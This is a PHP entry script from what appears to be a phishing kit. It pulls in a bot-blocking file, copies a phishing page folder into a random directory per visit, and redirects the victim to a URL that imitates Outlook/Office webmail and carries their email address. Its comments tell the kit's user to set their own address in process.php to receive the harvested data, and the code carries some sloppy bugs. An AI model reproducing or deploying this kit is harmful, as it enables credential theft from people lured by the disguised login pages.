<?php
// DONT CHANGE ANYTHING HERE JUST CHANGE YOUR EMAIL FROM folder ( look >> validator >> process.php >> $recipient
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!! Attention !!!!!!!!!!!!
// !!!! IF NOT WORKING CONTACT US  !!!
// !!!! IF NOT WORKING CONTACT US  !!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
include('blocker.php');

$id = $_POST[$log];
$random = rand(50000,100000000000);
$dst    = substr(md5($random), 0, 1000000000);
$log = base64_encode($_GET['loge']);

//+++++++++++++++++// CREATE FOLDER AND COPY FILE \\+++++++++++++++++\\

function recurse_copy($src,$dst)
{
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
		if (( $file != '.' ) && ( $file != '..' )) {
			if ( is_dir($src . '/' . $file) ) {
				recurse_copy($src . '/' . $file,$dst . '/' . $file);
			}
			else {
				copy($src . '/' . $file,$dst . '/' . $file);
			}
		}
	}
	closedir($dir);
}

$src="naf";
recurse_copy( $src, $dst );

header("location:".$dst."?Key=".$random."&rand=13InboxLightaspxn.".$random."1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.".$mds.".1774256418&fid.1252899642&fid.1&fav.1&login=".$log."&.rand=13InboxLight.aspx?n=".$random."1774256418&fid=4#n=1252899642&fid=1&fav=1&?office=&rand=13InboxLight.aspx");

?>
